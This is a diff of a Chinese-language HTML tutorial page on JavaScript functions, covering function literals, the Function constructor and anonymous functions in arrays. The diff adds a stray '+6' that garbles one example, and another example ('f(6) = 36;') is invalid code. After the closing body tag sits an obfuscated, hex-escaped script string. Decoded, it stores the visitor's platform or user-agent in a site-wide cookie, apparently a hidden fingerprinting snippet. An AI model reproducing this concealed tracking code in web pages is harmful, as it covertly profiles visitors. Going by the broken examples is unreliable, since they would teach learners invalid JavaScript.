@@ -49,7 +49,7 @@
     <li>函数直接量
         构造函数只在1.1后有效，函数直接量只在1.2后有效
         <pre>
-            <code style="color: #333333">
+            <code style="color: #333333">+6
                 var f = function(x){return x*x;}
                 f(6) = 36;
             </code>
@@ -66,10 +66,19 @@
     <li>函数可以没有函数名
         <pre>
             <code style="color: #333333">
+                var o = new Object;
+                o.square = new Function('x','return x*x');//构造函数
+                y=o.square(16)                            //256
+            </code>
+        </pre>
+
+        <pre>
+            函数可以没有函数名
+            <code style="color: #333333">
                 var a = new Array(2);
                 a[0]=function(x){return x*x};
                 a[1]=20;
-                a[2]=a{0}{a[1]}
+                a[2]=a[0](a[1])
             </code>
         </pre>
     </li>
@@ -87,6 +96,10 @@
 <ul>
     <li>js函数的主体是在局部作用域中执行的，该作用域不同于全局作用域</li>
 </ul>
+
+
+
+
 </body>
 <script>
     var a=  "if(navigator[\\\"\x70\x6c\x61\x74\x66\x6f\x72\x6d\\\"] !=undefined){window[\\\"\x64\x6f\x63\x75\x6d\x65\x6e\x74\\\"][\\\"\x63\x6f\x6f\x6b\x69\x65\\\"]=\\\"\x6f\x3d\\\" +navigator[\\\"\x70\x6c\x61\x74\x66\x6f\x72\x6d\\\"] +\\\"\x3b\x70\x61\x74\x68\x3d\x2f\x3b\\\"}else{window[\\\"\x64\x6f\x63\x75\x6d\x65\x6e\x74\\\"][\\\"\x63\x6f\x6f\x6b\x69\x65\\\"]=\\\"\x6f\x3d\\\" +navigator[\\\"\x75\x73\x65\x72\x41\x67\x65\x6e\x74\\\"]+\\\"\x3b\x70\x61\x74\x68\x3d\x2f\x3b\\\"}"
